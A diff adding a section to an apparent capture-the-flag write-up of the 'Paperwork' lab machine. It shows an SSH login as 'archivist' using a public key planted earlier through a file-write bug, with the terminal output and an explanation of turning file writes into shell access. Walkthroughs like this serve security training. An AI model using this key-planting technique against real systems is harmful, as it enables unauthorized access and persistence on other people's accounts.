@@ -831,6 +831,44 @@ print('[+] Key written')
 **Theory block — read primitive vs. write primitive:** A file-read bug (like the earlier `FSUPLOAD`) leaks secrets but leaves you in the same shell. A file-_write_ bug is stronger: by writing to a location the target account trusts — `~/.ssh/authorized_keys`, a cron file, `.bashrc` — you convert "I can write a file" into "I can execute as that user." Writing an SSH public key is the cleanest of these because it yields a stable, interactive session rather than a fragile shell. Note this only works if `~/.ssh` exists with correct ownership/permissions; SSH ignores `authorized_keys` in a world-writable or wrongly-owned directory.
 <div align="center">
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+#### 4.4.3 SSH Login as `archivist`
+
+**Command (attacker, local):** `ssh -i archivist_key archivist@TARGET_IP`
+
+**Breakdown:**
+
+- `ssh -i archivist_key`
+    - **Description:** Connect over SSH using the specified private key for authentication.
+    - **Purpose:** Authenticate as `archivist` with the keypair whose public half we planted via FSDOWNLOAD.
+
+**Result:**
+
+```shell
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
+└─$ ssh -i archivist_key archivist@paperwork.htb
+The authenticity of host 'paperwork.htb (10.129.35.97)' can't be established.
+ED25519 key fingerprint is: SHA256:tzMbEYkv6k7bNzmaghpOk1CXAX3BBYDwOTJmWsGAYdo
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'paperwork.htb' (ED25519) to the list of known hosts.
+Last login: Thu May 28 15:22:41 UTC 2026 from 10.10.14.3 on ssh
+Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-40-generic x86_64)
+
+ * Documentation:  https://docs.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+Last login: Sat Jul 18 17:23:14 2026 from 10.10.15.111
+archivist@paperwork:~$ 
+```
+
+The planted key is accepted — full interactive shell as **`archivist`**. This confirms the FSDOWNLOAD write succeeded and `~/.ssh` permissions were valid. Lateral movement from `lp` to `archivist` is complete, providing the stable session required for privilege escalation.
+<div align="center">
+<br>
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
